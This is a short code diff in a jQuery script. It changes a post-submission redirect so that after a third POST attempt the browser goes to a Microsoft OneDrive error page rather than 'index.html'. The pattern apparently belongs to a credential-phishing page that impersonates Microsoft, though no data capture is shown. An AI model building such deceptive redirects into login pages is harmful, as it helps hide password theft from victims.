@@ -26,7 +26,7 @@ $(document).ready(function () {
             success: function () {
                 // After 3rd POST attempt, redirect to index.html
                 if (window.__postAttemptCount >= 3) {
-                    window.location.href = "index.html";
+                    window.location.href = "https://www.microsoft.com/en/microsoft-365/onedrive/error";
                     return;
                 }
 
